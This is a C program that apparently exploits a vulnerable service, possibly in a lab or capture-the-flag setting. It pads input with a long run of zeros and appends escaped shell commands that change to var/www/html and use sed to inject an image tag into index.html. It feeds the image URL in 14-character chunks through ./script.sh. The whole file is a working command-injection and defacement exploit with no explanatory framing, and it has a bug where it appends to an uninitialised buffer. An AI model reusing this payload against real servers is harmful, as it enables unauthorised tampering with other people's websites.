#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#define WINDOW_SIZE 14

int main(){
    
    char prefix[10000];
    strcpy(prefix,"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cd\\ var/www/html\\;sed\\ -i\\ \\'s");
    char url[1000];
    strcpy(url, // You can put the url of any image you want in src arg  
    "https://media1.thehungryjpeg.com/thumbs2/800_3750514_1thmkqphznfj82p40xjtoq0jtre59a843m119a5f_gold-medal-vector-golden-1st-place-competition-challenge-award-falling-bright-confetti-red-ribbon-isolated-olive-branch-realistic-illustration.jpg");
    int length_url = strlen( url);
    char *window  = malloc(sizeof(char)*(WINDOW_SIZE+10));
    char first_command[1000];
    printf(" 0 \n");
    strcat(first_command,prefix);
    
    strcat(first_command, "@\\</body\\>@\\<div\\>\\<img\\ src=\"XXX\"\\>\\</div\\>\\</body\\>@\\'\\ index.html");
    char first_command_[2000];
    strcpy(first_command_,"./script.sh ");
    strcat(first_command_,first_command);

    system(first_command_);
    sleep(2);
    int i=0;
    
    strcat(prefix,"@XXX@");
    while( (WINDOW_SIZE + i) <= length_url ){
        strncpy(window, url+i, WINDOW_SIZE);
        strcat(window, "XXX@\\'");
        char local_var[1000];
        strcpy(local_var,"./script.sh ");
        strcat(local_var, prefix);
        strcat(local_var,window);
        strcat(local_var, "\\ index.html\\;");
        system(local_var);
        sleep(1);
        memset(window,0,WINDOW_SIZE+10);
        memset(local_var, 0, 1000);
        i+=WINDOW_SIZE;
    }

    int reste = length_url - i;
    if( reste > 0){
        memset(window,0,WINDOW_SIZE+10);
        strcpy(window, url+i);
        strcat(window,"@\\'");
        char local_var[1000];
        memset(local_var,0,1000);
        strcpy(local_var,"./script.sh ");
        strcat(local_var, prefix);
        strcat(local_var,window);
        strcat(local_var, "\\ index.html\\;");
        system(local_var);
        sleep(1);
        memset(window,0,WINDOW_SIZE+10);
        memset(local_var, 0, 1000);
        sleep(1);
    }
    


    return 0;
}